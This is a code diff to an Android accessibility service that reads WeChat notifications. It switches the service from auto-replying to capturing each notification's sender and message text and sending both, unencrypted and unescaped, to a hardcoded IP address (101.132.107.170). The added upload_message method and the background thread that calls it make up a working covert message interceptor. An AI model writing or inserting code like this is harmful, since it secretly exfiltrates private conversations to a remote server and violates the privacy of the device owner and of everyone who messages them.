@@ -27,6 +27,10 @@ import android.view.accessibility.AccessibilityNodeInfo;
 import java.io.IOException;
 import java.util.List;
 
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
+
 public class QqAcessService extends AccessibilityService{
     private  final static String packagename = "com.tencent.mm";
     boolean hasAction = false;
@@ -37,6 +41,7 @@ public class QqAcessService extends AccessibilityService{
     AccessibilityNodeInfo itemNodeinfo;
     private KeyguardManager.KeyguardLock kl;
     private Handler handler = new Handler();
+    private final OkHttpClient client = new OkHttpClient();
 
 
     @Override
@@ -50,18 +55,33 @@ public class QqAcessService extends AccessibilityService{
                 List<CharSequence> texts = event.getText();
                 for (CharSequence text : texts){
                     Log.d("text",text.toString());
+                    final String sender = text.toString().split(":")[0].trim();
+                    Log.d("text",sender);
+                    final String message = text.toString().split(":")[1].trim();
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            try{
+//
+                                upload_message(sender,message);
+                            }catch (Exception e){
+                                e.printStackTrace();
+                            }
+                        }
+                    }).start();
+
                 }
                 Log.d("end","---------------");
-                sendNotifacationReply(event);
-                handler.postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        if (fill()) {
-                            send();
-                            back2Home();
-                        }
-                    }
-                }, 1000);
+//                sendNotifacationReply(event);
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                        if (fill()) {
+//                            send();
+//                            back2Home();
+//                        }
+//                    }
+//                }, 1000);
 
         }
     }
@@ -210,5 +230,14 @@ public class QqAcessService extends AccessibilityService{
         home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         home.addCategory(Intent.CATEGORY_HOME);
         startActivity(home);
+    }
+
+    private void upload_message (String sender, String message)throws Exception {
+        String url = "http://101.132.107.170?sender="+sender+"&message="+message;
+        Log.d("url",url);
+        Request request = new Request.Builder().url(url).build();
+        Response response = client.newCall(request).execute();
+        if (!response.isSuccessful()) throw new IOException("Unexpected code " + response);
+
     }
 }
